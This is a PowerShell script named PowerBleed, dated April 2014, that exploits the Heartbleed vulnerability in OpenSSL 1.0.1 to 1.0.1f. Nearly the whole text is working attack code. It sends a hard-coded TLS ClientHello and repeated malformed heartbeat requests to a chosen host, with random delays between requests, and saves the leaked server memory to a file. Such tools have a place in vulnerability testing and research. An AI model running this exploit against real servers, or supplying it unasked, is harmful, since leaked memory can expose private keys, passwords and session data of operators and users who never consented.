<#
.SYNOPSIS

Exploit the OpenSSL 1.0.1 - 1.0.1f TLS HeartBeat vulnerability.
Author: Joff Thyer, April 2014
Concept suggestion by Tim Tomes.

.DESCRIPTION

Sends a malformed TLS heartbeat request as many times as you want to and write
the returned data into a file.

.PARAMETER Hostname

Either a domain name or IP address can be provided.

.PARAMETER Port

The default TCP port is 443 however any other port may be specified
here.

.PARAMETER TLSTries

Perform a full TLS connection to the server this many times. The default
for this parameter is 3. More data may be leaked with continued connect
attempts.

.PARAMETER Heartbeats

For a single TLS connection, send this many heartbeat requests
and gather the resulting data.  This defaults to 3 also.

.PARAMETER NoRandomDelay

Disable the random delay between heartbeat requests.  The random
delay will be calculated between 0 and 1000 milliseconds.

.PARAMETER Timeout

The TCP timeout for a connect request.  Also this is the
read bytes timeout during the response reading.  This will
timeout if the server does not support the TLS heartbeat function.

#>

function PowerBleed {

    Param(
        [Parameter(Mandatory=$true,HelpMessage="IP address or hostname to check")][string]$Hostname,
        [Parameter(HelpMessage="File to write resulting data to")][string]$File="$Hostname-hbdata.dat",
        [Parameter(HelpMessage="TCP port number that SSL application is listening on")][int]$Port=443,
        [Parameter(HelpMessage="Number of heartbeats to send")][int]$TLSTries=3,
        [Parameter(HelpMessage="Number of heartbeats to send")][int]$Heartbeats=3,
        [Parameter(HelpMessage="TCP and read connection timeout")][int]$Timeout=1000,
        [Parameter(HelpMessage="Whether to randomly delay between heartbeats")][switch]$NoRandomDelay=$false
    )

    $tls_clienthello = [Byte[]] (
0x16, 0x03, 0x02, 0x00, 0xdc, 0x01, 0x00, 0x00, 0xd8, 0x03, 0x02, 0x53, 0x43, 0x5b, 0x90, 0x9d,
0x9b, 0x72, 0x0b, 0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97, 0xcf, 0xbd, 0x39, 0x04, 0xcc,
0x16, 0x0a, 0x85, 0x03, 0x90, 0x9f, 0x77, 0x04, 0x33, 0xd4, 0xde, 0x00, 0x00, 0x66, 0xc0, 0x14,
0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21, 0x00, 0x39, 0x00, 0x38, 0x00, 0x88, 0x00, 0x87, 0xc0, 0x0f,
0xc0, 0x05, 0x00, 0x35, 0x00, 0x84, 0xc0, 0x12, 0xc0, 0x08, 0xc0, 0x1c, 0xc0, 0x1b, 0x00, 0x16,
0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03, 0x00, 0x0a, 0xc0, 0x13, 0xc0, 0x09, 0xc0, 0x1f, 0xc0, 0x1e,
0x00, 0x33, 0x00, 0x32, 0x00, 0x9a, 0x00, 0x99, 0x00, 0x45, 0x00, 0x44, 0xc0, 0x0e, 0xc0, 0x04,
0x00, 0x2f, 0x00, 0x96, 0x00, 0x41, 0xc0, 0x11, 0xc0, 0x07, 0xc0, 0x0c, 0xc0, 0x02, 0x00, 0x05,
0x00, 0x04, 0x00, 0x15, 0x00, 0x12, 0x00, 0x09, 0x00, 0x14, 0x00, 0x11, 0x00, 0x08, 0x00, 0x06,
0x00, 0x03, 0x00, 0xff, 0x01, 0x00, 0x00, 0x49, 0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02,
0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e, 0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c,
0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16, 0x00, 0x17, 0x00, 0x08, 0x00, 0x06, 0x00, 0x07,
0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05, 0x00, 0x12, 0x00, 0x13, 0x00, 0x01, 0x00, 0x02,
0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11, 0x00, 0x23, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x01,
0x01)

    $heartbeat = [Byte[]] ( 0x18, 0x03, 0x02, 0x00, 0x03, 0x01, 0x40, 0x00 )
    $ErrorActionPreference = "Continue"

    $VERSION="20140414-1501"

    Write-Host "
[*] PowerBleed Version $VERSION
[*] Author: Joff Thyer, April 2014
[*] Acknowledgments to Tim Tomes.
[*] Reference: http://packetstormsecurity.com/files/126070/Heartbleed-Proof-Of-Concept.html
"

    $IP = [System.Net.Dns]::GetHostByName($Hostname).AddressList[0].IPAddressToString
    $offset = 0
    $buf = New-Object Byte[] 8388608
    for ($nt = 0; $nt -lt $TLSTries; $nt++) {
        $msg = "[*] Connection attempt number: {0}" -f ($nt + 1)
        Write-Host $msg
        Try {
            $tcp = New-Object System.Net.Sockets.TcpClient
            $conn = $tcp.BeginConnect($IP,$Port,$null,$null)
            $wait = $conn.AsyncWaitHandle.WaitOne($Timeout,$false)
            if (!$wait) {
                Throw [System.Exception] "TCP Connection Timeout Exceeded"
            }
            $tcp.EndConnect($conn)
            Try {
                $stream = $tcp.GetStream()
            }
            Catch {
                Throw
            }
    
            # send TLS client hello
            Try {
                $stream.Write($tls_clienthello,0,$tls_clienthello.Length)
            }
            Catch {
                Throw
            }

            # get TLS server hello
            $temp = New-Object Byte[] 16384
            $n = $stream.Read($temp,0,$temp.length)
            if ( $temp[0] -ne 0x16) {
                Throw [System.Exception] "Malformed TLS Server Hello"
            }

            Write-Host "    [*] Sending $Heartbeats TLS heartbeat packets"
            for ($i=0; $i -lt $Heartbeats; $i++) {
                Try {
                    $stream.Write($heartbeat,0,$heartbeat.Length)
                    Write-Host -NoNewline "        [+] "
                    Write-Host -NoNewline "<3"
                }
                Catch {
                    Throw
                }
                Try {
                    $awh = $stream.BeginRead($buf,$offset,$buf.length-$offset,$null,$null)
                    $wait = $awh.AsyncWaitHandle.WaitOne($Timeout,$false)
                    if(!$wait) {
                        Write-Host "`n`n"
                        Throw [System.Exception] "No Response to TLS HeartBeat() request.  Host is not vulnerable!"
                    }
                    $n = $stream.EndRead($awh)
                    $offset += $n
                }
                Catch {
                    Throw
                }
                $msg = ": {0,5} bytes returned from server. ({1} total bytes)" -f $n,$offset
                Write-Host $msg
                if (!$NoRandomDelay) {
                    $sleeptime = Get-Random -Minimum 0 -Maximum 500
                    Start-Sleep -Milliseconds $sleeptime
                }
            }
            Write-Host
        }
        Catch {
            Throw
        }
        Finally {
            $tcp.close()
        }
        Write-Host
    }
    $msg = "[*] Writing {0} total bytes to '$File'" -f $offset
    Write-Host $msg
    [IO.File]::WriteAllBytes($File,$buf[0..$offset])
}